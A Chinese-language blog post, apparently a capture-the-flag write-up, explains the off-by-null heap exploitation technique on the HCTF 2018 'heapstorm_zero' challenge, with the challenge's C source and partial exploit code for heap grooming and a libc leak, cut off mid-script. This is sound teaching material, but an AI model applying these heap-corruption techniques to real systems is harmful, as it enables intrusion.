<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>off-by-null | nocbtm's Blog</title><meta name="description" content="off-by-null"><meta name="keywords" content="pwn"><meta name="author" content="nocbtm"><meta name="copyright" content="nocbtm"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon3.ico"><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="canonical" href="https://nocbtm.github.io/2020/02/25/off-by-null/"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="off-by-null"><meta name="twitter:description" content="off-by-null"><meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><meta property="og:type" content="article"><meta property="og:title" content="off-by-null"><meta property="og:url" content="https://nocbtm.github.io/2020/02/25/off-by-null/"><meta property="og:site_name" content="nocbtm's Blog"><meta property="og:description" content="off-by-null"><meta property="og:image" content="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="prev" title="malloc源码简单分析" href="https://nocbtm.github.io/2020/03/05/malloc源码简单分析/"><link rel="next" title="unlink" href="https://nocbtm.github.io/2020/02/25/unlink/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://nocbtm.github.io","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  highlight_copy: 'true',
  highlight_lang: 'true',
  highlight_shrink: 'false',
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: '添加书签',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  copyright: {"languages":{"author":"作者: nocbtm","link":"链接: https://nocbtm.github.io/2020/02/25/off-by-null/","source":"来源: nocbtm's Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  copy_copyright_js: true
  
}</script></head><body><div id="header"> <div id="page-header"><span class="pull-left" id="blog_name"><a class="blog_title" id="site-name" href="/">nocbtm's Blog</a></span><i class="fa fa-bars fa-fw toggle-menu pull-right close" aria-hidden="true"></i><span class="pull-right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 大佬博客</span></a></div><div class="menus_item"><a class="site-page" href="/learn/"><i class="fa-fw fa fa-book"></i><span> 学习资源</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> (o≖◡≖)</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/gallery/"><i class="fa-fw fa fa-area-chart"></i><span> 相册</span></a></li><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 影片</span></a></li><li><a class="site-page" href="/link2/"><i class="fa-fw fa fa-book"></i><span> 学弟学妹们</span></a></li></ul></div><script>document.body.addEventListener('touchstart', function(){ });</script></div></span><span class="pull-right" id="search_button"></span></div></div><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="lozad avatar_img" src="/img/header1.png" onerror="onerror=null;src='/img/friend_404.gif'"></div><div class="mobile_post_data"><div class="mobile_data_item is_center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">66</div></a></div></div><div class="mobile_data_item is_center">      <div class="mobile_data_link"><a href="/tags/"><div class="headline">标签</div><div class="length_num">12</div></a></div></div><div class="mobile_data_item is_center">     <div class="mobile_data_link"><a href="/categories/"><div class="headline">分类</div><div class="length_num">13</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 大佬博客</span></a></div><div class="menus_item"><a class="site-page" href="/learn/"><i class="fa-fw fa fa-book"></i><span> 学习资源</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> 关于</span></a></div><div class="menus_item"><a class="site-page"><i class="fa-fw fa fa-list" aria-hidden="true"></i><span> (o≖◡≖)</span><i class="fa fa-chevron-down menus-expand" aria-hidden="true"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/gallery/"><i class="fa-fw fa fa-area-chart"></i><span> 相册</span></a></li><li><a class="site-page" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fa fa-film"></i><span> 影片</span></a></li><li><a class="site-page" href="/link2/"><i class="fa-fw fa fa-book"></i><span> 学弟学妹们</span></a></li></ul></div><script>document.body.addEventListener('touchstart', function(){ });</script></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目录</div><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#前言"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">前言</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#程序分析"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">程序分析</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#init"><span class="toc_mobile_items-number">2.1.</span> <span class="toc_mobile_items-text">init</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Allocate"><span class="toc_mobile_items-number">2.2.</span> <span class="toc_mobile_items-text">Allocate</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#View"><span class="toc_mobile_items-number">2.3.</span> <span class="toc_mobile_items-text">View</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Delete"><span class="toc_mobile_items-number">2.4.</span> <span class="toc_mobile_items-text">Delete</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#利用分析"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">利用分析</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#简述"><span class="toc_mobile_items-number">3.1.</span> <span class="toc_mobile_items-text">简述</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#信息泄露"><span class="toc_mobile_items-number">3.2.</span> <span class="toc_mobile_items-text">信息泄露</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#getshell"><span class="toc_mobile_items-number">3.3.</span> <span class="toc_mobile_items-text">getshell</span></a></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#另一种布局"><span class="toc_mobile_items-number">4.</span> <span class="toc_mobile_items-text">另一种布局</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-2"><a class="toc_mobile_items-link" href="#Tcache下的利用"><span class="toc_mobile_items-number">5.</span> <span class="toc_mobile_items-text">Tcache下的利用</span></a></li></ol></div></div><div id="body-wrap"><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#程序分析"><span class="toc-number">2.</span> <span class="toc-text">程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#init"><span class="toc-number">2.1.</span> <span class="toc-text">init</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Allocate"><span class="toc-number">2.2.</span> <span class="toc-text">Allocate</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#View"><span class="toc-number">2.3.</span> <span class="toc-text">View</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Delete"><span class="toc-number">2.4.</span> <span class="toc-text">Delete</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用分析"><span class="toc-number">3.</span> <span class="toc-text">利用分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#简述"><span class="toc-number">3.1.</span> <span class="toc-text">简述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#信息泄露"><span class="toc-number">3.2.</span> <span class="toc-text">信息泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#getshell"><span class="toc-number">3.3.</span> <span class="toc-text">getshell</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#另一种布局"><span class="toc-number">4.</span> <span class="toc-text">另一种布局</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Tcache下的利用"><span class="toc-number">5.</span> <span class="toc-text">Tcache下的利用</span></a></li></ol></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png)"><div id="post-info"><div id="post-title"><div class="posttitle">off-by-null</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 发表于 2020-02-25<span class="post-meta__separator">|</span><i class="fa fa-history" aria-hidden="true"></i> 更新于 2020-04-07</time><span class="post-meta__separator mobile_hidden">|</span><span class="mobile_hidden"><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/pwn/">pwn</a></span><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">3,130</span><span class="post-meta__separator">|</span><span>阅读时长: 14 分钟</span><span class="post-meta__separator">|</span><span>阅读量: </span><span id="busuanzi_value_page_pv"></span></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>off by null 是一个比较有意思的技术 下面通过 hctf2018 的 heapstrom_zero 实战一波。</p>
<p>题目链接 <a href="https://github.com/veritas501/hctf2018" target="_blank" rel="noopener">https://github.com/veritas501/hctf2018</a></p>
<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><p>直接拿源码分析，程序是一个比较简单的菜单程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">int main(void)&#123;</span><br><span class="line">	init();</span><br><span class="line">	while(1)&#123;</span><br><span class="line">		switch(menu_getinput())&#123;</span><br><span class="line">			case 1:&#123;</span><br><span class="line">				Allocate();</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">			case 2:&#123;</span><br><span class="line">				View();</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">			case 3:&#123;</span><br><span class="line">				Delete();</span><br><span class="line">				break;</span><br><span class="line">			&#125;</span><br><span class="line">			case 4:&#123;</span><br><span class="line">				puts(&quot;Bye!&quot;);</span><br><span class="line">				exit(0);</span><br><span class="line">			&#125;</span><br><span class="line">			default:&#123;</span><br><span class="line">				puts(&quot;Invaild choice!&quot;);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先初始化一些东西，比如随机 mmap 一块内存用来存放指针之类的。然后提供三个选项供用户选择。</p>
<h3 id="init"><a href="#init" class="headerlink" title="init"></a>init</h3><p>看看 init 函数。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">	sum=<span class="number">0</span>;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Open urandom error!!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">void</span> * pageaddr;</span><br><span class="line">	<span class="keyword">if</span>(read(fd,&amp;pageaddr,<span class="keyword">sizeof</span>(<span class="keyword">void</span> *)) == <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	pageaddr = (<span class="keyword">void</span> *)(((<span class="keyword">size_t</span>)(pageaddr)&amp;~<span class="number">0xfff</span>)%<span class="number">0x133700000000</span>);</span><br><span class="line">	<span class="comment">// 随机mmap 一块内存，存放程序分配的内存指针</span></span><br><span class="line">	page = mmap(pageaddr,<span class="number">0x1000</span>,<span class="number">3</span>,<span class="number">34</span>,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span>(page != pageaddr)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"mmap error!!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 随机生成秘钥，用于加密指针</span></span><br><span class="line">	<span class="keyword">if</span>(read(fd,&amp;(page-&gt;xorkey),<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)) == <span class="number">-1</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Read urandom error!!\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x20</span>;i++)&#123;</span><br><span class="line">		page-&gt;chunk[i]=(<span class="keyword">char</span> *)page-&gt;xorkey;</span><br><span class="line">	&#125;</span><br><span class="line">	bar();</span><br><span class="line">	close(fd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>分配一块内存，然后生成一个随机秘钥，秘钥的作用是把程序分配的内存的指针异或加密一下。</p>
<h3 id="Allocate"><a href="#Allocate" class="headerlink" title="Allocate"></a>Allocate</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Allocate</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	<span class="keyword">if</span>(sum &gt; <span class="number">0x20</span>u)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Please input chunk size:"</span>);</span><br><span class="line">	<span class="keyword">int</span> size = read_int();   </span><br><span class="line">	<span class="comment">// size 最大为0x38</span></span><br><span class="line">	<span class="keyword">if</span>(!check_chunksize(size))&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Invalid size!"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">char</span> * p = (<span class="keyword">char</span> *)<span class="built_in">calloc</span>(size, <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span>(!p)&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Alloc error!!"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Please input chunk content:"</span>);</span><br><span class="line">	<span class="comment">// read_n 会向p[size]='\x00',所以有一字节的溢出，溢出的字节为'\x00'</span></span><br><span class="line">	read_n(p, size);</span><br><span class="line">	<span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span> &amp;&amp; (<span class="keyword">size_t</span>)page-&gt;chunk[i]^page-&gt;xorkey; ++i )&#123;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> ( i == <span class="number">32</span> )&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Too many chunks!"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 指针xor加密存放</span></span><br><span class="line">	page-&gt;chunk[i] = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)p^page-&gt;xorkey);</span><br><span class="line">	++sum;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Chunk index: %d\n"</span>,i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先让用户输入一个 size , 然后判断 size 最大只能为 0x38 ， 这意味着我们只能分配 fastbin 的 chunk. 分配好内存后，会读入数据到里面，这时候会有一个 \x00 字节的溢出。</p>
<h3 id="View"><a href="#View" class="headerlink" title="View"></a>View</h3><p>就是把指针解密出来，然后用 printf 打印内容。</p>
<h3 id="Delete"><a href="#Delete" class="headerlink" title="Delete"></a>Delete</h3><p>解密出指针，然后释放掉，同时把相关的项设置为初始状态。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Please input chunk index: "</span>);</span><br><span class="line">	<span class="keyword">int</span> idx = read_int();</span><br><span class="line">	<span class="keyword">if</span> ( idx &lt; <span class="number">0</span> || idx &gt; <span class="number">31</span> )&#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">"Invalid index!"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">char</span> *p = (<span class="keyword">char</span>*)((<span class="keyword">size_t</span>)page-&gt;chunk[idx]^page-&gt;xorkey);</span><br><span class="line">	<span class="keyword">if</span> ( p )</span><br><span class="line">	&#123;</span><br><span class="line">		--sum;</span><br><span class="line">		<span class="built_in">free</span>(p);</span><br><span class="line">		page-&gt;chunk[idx] = (<span class="keyword">char</span>*)(page-&gt;xorkey);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>总结一下程序的功能。</p>
<p>我们最多只能 malloc(0x38) 即 0x40 大小的 chunk.<br>有一个 打印 chunk 内容的函数。<br>分配时可以 off by null.</p>
<h2 id="利用分析"><a href="#利用分析" class="headerlink" title="利用分析"></a>利用分析</h2><h3 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h3><p>一字节溢出的利用围绕着的是 堆块在分配，释放，合并时对 chunk 的 size 域的信任关系。而如果只是 fastbin 的话 off by null 是没法利用的，因为只要溢出就会把 size 设置为 0.</p>
<p>这里有一个 tips , 使用 scanf 获取内容时，如果 输入字符串比较长会调用 malloc 来分配内存。</p>
<p>在 malloc 分配内存时，首先会一次扫描一遍 fastbin , smallbin ， unsorted bin ，largebin, 如果都找不到可以分配的 chunk 分配给用户 ， 会进入 top_chunk 分配的流程， 如果此时还有 fastbin ，就会触发堆合并机制，把 fastbin 合并 之后放入 smallbin，再看能否分配，不能的话会使用 top_chunk 进行分配。</p>
<p>于是利用 scanf 能分配大内存的特性，我们可以触发 堆合并，然后让 fastbin 合并成一个 smallbin , 然后在触发 off-by-null , 就是常规的利用思路了。</p>
<h3 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h3><p>首先分配 12 个 chunk, 其中 第一个 和最后一个保留， 第一个 chunk 用于 触发 off-by-null ， 最后一个用于防止在 堆合并时与 top_chunk 进行合并。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">'a'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 9</span></span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x20</span> + p64(<span class="number">0x200</span>) + p64(<span class="number">0x20</span>)  <span class="comment"># shrink chunk 前，配置好</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'end'</span>)  <span class="comment"># 11  , 保留块， 防止和 top chunk 合并</span></span><br></pre></td></tr></table></figure>
<p>然后把中间的 10 个 chunk 释放掉，同时触发 堆合并，构造一个 0x210 大小的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 释放掉 chunk</span><br><span class="line">for i in range(1, 11):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line"># 利用 scanf 分配大内存 0x400+ , 会触发堆合并</span><br><span class="line"># fastbin 会合并进入 smallbin</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p>
<p>函数 triger_consolidate 的逻辑就是发送 0x400 的字符串给 scanf 处理，然后 scanf 会分配大内存，触发 堆合并。</p>
<p>此时的内存布局如下</p>
<p><img alt="" data-src="/imgs/off-by-null-1.png" class="lozad"></p>
<p>图中特殊标出的 0x200 | 0x20 用于保证后续利用过掉 check.</p>
<p>然后利用 chunk 0 , 溢出 一字节的 \x00 , 修改下面那个 smallbin 的 size —&gt; 0x200</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 利用 chunk 0 , 溢出 一字节的 \x00 , 修改 size ---&gt; 0x200</span></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br></pre></td></tr></table></figure>
<p>紧接着在这个剩下的 0x200 字节的 smallbin 里面分配 8 个 chunk , 然后利用同样的方法，在里面构造一个 smallbin</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 5</span></span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'x'</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 7</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'x'</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用 大量的 fastbin + 堆合并 构造 smallbin , 大小 0xc0</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">2</span>)</span><br><span class="line">dele(<span 